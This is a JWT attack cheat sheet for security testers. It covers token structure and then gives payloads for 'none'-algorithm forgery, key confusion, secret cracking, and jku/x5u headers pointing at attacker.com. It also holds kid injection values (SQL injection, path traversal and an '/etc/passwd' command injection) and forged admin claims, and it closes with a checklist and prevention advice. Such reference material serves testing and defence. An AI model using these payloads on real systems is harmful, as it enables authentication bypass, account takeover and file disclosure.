# JSON Web Token (JWT) Attacks

## Description
JWT (JSON Web Token) is a compact, URL-safe means of representing claims between two parties. JWTs are commonly used for authentication and session management. Various vulnerabilities can arise from improper implementation, weak secrets, and algorithmic weaknesses.

## JWT Structure

```
Header.Payload.Signature

# Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Header
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload (Claims)
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": false,
  "iat": 1516239022,
  "exp": 1516242622
}
```

### Common Algorithms
```
Symmetric:
- HS256 (HMAC with SHA-256)
- HS384 (HMAC with SHA-384)
- HS512 (HMAC with SHA-512)

Asymmetric:
- RS256 (RSA Signature with SHA-256)
- RS384 (RSA Signature with SHA-384)
- RS512 (RSA Signature with SHA-512)
- ES256 (ECDSA with SHA-256)
- PS256 (RSA-PSS with SHA-256)
```

## Attack Techniques

### 1. None Algorithm Attack (CVE-2015-9235)

Change the algorithm to "none" and remove the signature:

```python
# Original header
{"alg": "HS256", "typ": "JWT"}

# Modified header
{"alg": "none", "typ": "JWT"}

# Variations to try:
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

**Payload:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.
```
(Note: Empty signature or trailing dot)

### 2. Algorithm Confusion (RS256 to HS256)

When server expects RS256 but accepts HS256, use the public key as HMAC secret:

```python
import jwt

# Get the public key
public_key = open('public.pem').read()

# Create token with HS256 using public key as secret
token = jwt.encode(
    {"sub": "admin", "admin": True},
    public_key,
    algorithm="HS256"
)
```

**Attack Steps:**
1. Obtain the public key (often in JWKS endpoint or certificate)
2. Change algorithm from RS256 to HS256
3. Sign the token with the public key

### 3. Weak Secret Brute Force

```bash
# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Using hashcat
# First extract hash: jwt_tool.py <JWT> -T
hashcat -a 0 -m 16500 jwt_hash.txt wordlist.txt

# Using john
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

### 4. JKU Header Injection

The `jku` header points to a URL containing the JSON Web Key Set:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

**Attack:**
1. Generate your own key pair
2. Host JWKS on attacker server
3. Point jku to your server
4. Sign token with your private key

### 5. JWK Header Injection

Embed the key directly in the header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB"
  }
}
```

### 6. Kid Header Injection

The `kid` (Key ID) header can be exploited for:

#### SQL Injection
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'secretkey' -- "
}
```

#### Path Traversal
```json
{
  "kid": "../../../dev/null"
}
```
(Signs with empty file)

#### Command Injection
```json
{
  "kid": "key1|/bin/cat /etc/passwd"
}
```

### 7. X5U Header Injection

```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/cert.pem"
}
```

### 8. Signature Not Verified

Simply modify the payload and keep or remove the signature:

```bash
# Decode, modify, re-encode (base64)
echo 'eyJhZG1pbiI6ZmFsc2V9' | base64 -d
# {"admin":false}

# Modify and re-encode
echo -n '{"admin":true}' | base64
# eyJhZG1pbiI6dHJ1ZX0=
```

## Tools

### jwt_tool
```bash
# https://github.com/ticarpi/jwt_tool

# Scan for vulnerabilities
python3 jwt_tool.py <JWT> -S

# All tests
python3 jwt_tool.py <JWT> -A

# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Tamper claims
python3 jwt_tool.py <JWT> -T

# Exploit specific vulnerability
python3 jwt_tool.py <JWT> -X a  # Algorithm None
python3 jwt_tool.py <JWT> -X k  # Key confusion
```

### jwt.io
```
Online JWT decoder and encoder
https://jwt.io
```

### Burp JWT Editor
```
1. Install from BApp Store
2. Capture JWT in request
3. Send to JWT Editor
4. Modify and sign
```

## Common JWT Endpoints

```
/.well-known/jwks.json
/oauth/jwks
/api/keys
/jwt/keys
/.well-known/openid-configuration
```

## Exploitation Scenarios

### Privilege Escalation
```json
// Original payload
{"sub": "user123", "role": "user", "admin": false}

// Modified payload
{"sub": "user123", "role": "admin", "admin": true}
```

### Account Takeover
```json
// Original payload
{"sub": "user123", "email": "user@example.com"}

// Modified payload
{"sub": "admin", "email": "admin@example.com"}
```

### Session Extension
```json
// Original payload
{"sub": "user123", "exp": 1609459200}

// Modified payload - far future expiration
{"sub": "user123", "exp": 9999999999}
```

## Testing Checklist

- [ ] Test "none" algorithm
- [ ] Test algorithm confusion (RS256 → HS256)
- [ ] Attempt secret brute force
- [ ] Test JKU header injection
- [ ] Test JWK header injection
- [ ] Test KID injection (SQLi, Path Traversal)
- [ ] Check if signature is verified
- [ ] Test expired token acceptance
- [ ] Check for sensitive data in payload
- [ ] Test claim modification

## Prevention

```
1. Use strong, unique secrets (256+ bits for HMAC)
2. Validate algorithm server-side
3. Reject "none" algorithm
4. Validate all header parameters
5. Use asymmetric keys when possible
6. Implement proper expiration
7. Don't store sensitive data in payload
8. Use libraries with secure defaults
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- https://portswigger.net/web-security/jwt
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
